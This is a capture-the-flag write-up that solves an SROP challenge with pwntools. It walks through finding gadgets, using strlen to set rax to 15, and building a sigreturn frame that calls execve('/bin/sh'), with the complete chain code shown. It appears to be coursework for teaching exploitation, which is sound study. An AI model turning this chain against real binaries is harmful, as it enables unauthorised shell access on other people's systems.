# SROP:Solution

The binary is compiled with NX and Partial RELRO
```
pwn checksec chal.bin                                                               
[*] '/root/workspace/vuln/srop/chal/chal.bin'                                  
    Arch:     amd64-64-little                                                  
    RELRO:    Partial RELRO                                                    
    Stack:    No canary found                                                 
    NX:       NX enabled                                                       
    PIE:      No PIE (0x400000)
```

and is dynamically linked to GLIBC.
```
ldd chal.bin
    linux-vdso.so.1 (0x00007ffc653d1000)
    libc.so.6 => /lib64/libc.so.6 (0x00007f432a200000)
    /lib64/ld-linux-x86-64.so.2 (0x00007f432a463000)
```

First we have to find the primitives we'll need. We want to use the syscall 15 which is sys_rt_sigreturn. In order to get the number 15 we can use strlen on a string that is 15 long, or in this case the address of one length 17 + 2 which moves it over and changed it to 15. We can use rabin2 to get the address of a /bin/sh in memory.

```
syscall = r.find_gadget(['syscall'])[0]
str_15 = 0x4020c9 + 2		# 17 -2
bin_sh = 0x4011ba
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
ret = pop_rdi + 1
```

Then we create our fake frame. This is basically just and execve call with the parameter of /bin/sh.
```
''' execve(/bin/sh) '''
frame = SigreturnFrame()
frame.rax = constants.SYS_execve # rax = sys_execve (0x3b)
frame.rdi = bin_sh		 # rdi = fake stack (0x41500)->/bin/sh
frame.rsi = 0x0			 # rsi = NULL (0x0)
frame.rdx = 0x0			 # rdx = NULL (0x0)
frame.rip = syscall
```
We create the padding for the buffer and base pointer and then align the stack.
```
chain = b'A' * 16 		 # buffer + base pointer
chain += p64(ret)
```

Then we pop rdi so that we can fill it with the string to run strlen on.
```
chain += p64(pop_rdi)		 # pop rdi ret
chain += p64(str_15)		 # filled rdi
chain += p64(e.sym['strlen'])	 # calling strlen so 15 is in rax
```

Last we add the syscall and the fake frame and send the chain.
```
chain += p64(syscall)		 # syscall 15
chain += bytes(frame)

p.sendline(chain)		

p.interactive()
```

We have our flag!
```
flag{ev3ry1_G0t_th3iR_cHains_2br3aK}
```

Resources:
* Class slides
* Demo solve script
* Louie
* https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
